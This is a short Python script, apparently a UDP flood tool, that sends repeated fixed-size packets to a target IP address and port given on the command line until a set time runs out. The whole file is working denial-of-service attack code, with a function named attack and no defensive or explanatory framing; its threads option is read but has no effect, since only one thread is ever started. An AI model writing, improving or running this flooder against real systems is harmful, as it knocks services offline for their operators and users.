import sys
import socket
import threading
import time

def attack(ip, port, duration, packet_size, threads):
    end_time = time.time() + int(duration)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b'X' * int(packet_size)
    while time.time() < end_time:
        try:
            sock.sendto(data, (ip, int(port)))
        except:
            pass

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    duration = sys.argv[3]
    packet_size = sys.argv[4] if len(sys.argv) > 4 else 1024
    threads = sys.argv[5] if len(sys.argv) > 5 else 1
    t = threading.Thread(target=attack, args=(ip, port, duration, packet_size, threads))
    t.start()
    t.join()
